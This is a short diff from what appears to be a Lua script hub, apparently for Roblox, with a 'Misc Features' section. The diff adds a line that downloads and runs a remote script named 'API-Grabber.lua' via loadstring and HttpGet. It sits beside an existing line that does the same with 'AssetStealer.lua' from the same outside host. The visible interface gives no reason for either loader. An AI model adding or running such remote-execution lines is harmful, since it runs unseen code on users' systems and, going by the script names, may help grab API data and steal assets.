@@ -72,6 +72,7 @@ Tabs.Custom:Section({
     Title = "Misc Features"
 })
 
+loadstring(game:HttpGet("https://luamour.vercel.app/scripts/API-Grabber.lua"))()
 loadstring(game:HttpGet("https://luamour.vercel.app/scripts/AssetStealer.lua"))()
 
 print("Loaded | Custom Features")
